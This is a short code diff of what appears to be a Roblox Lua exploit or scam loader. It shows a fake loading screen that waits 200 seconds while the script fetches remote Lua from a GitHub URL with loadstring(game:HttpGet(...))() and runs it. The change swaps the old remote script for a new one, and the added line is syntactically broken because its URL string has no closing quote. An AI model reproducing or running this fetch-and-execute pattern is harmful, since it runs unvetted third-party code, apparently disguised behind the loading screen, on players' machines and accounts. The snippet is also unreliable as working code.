@@ -20,4 +20,4 @@ _G.ThirdText = "Almost Done..."
 
 _G.WaitingTime = 200 -- it's the time between 0% and 100% in secondes
 
-loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/RizzMain/main/rizzbest.lua))()
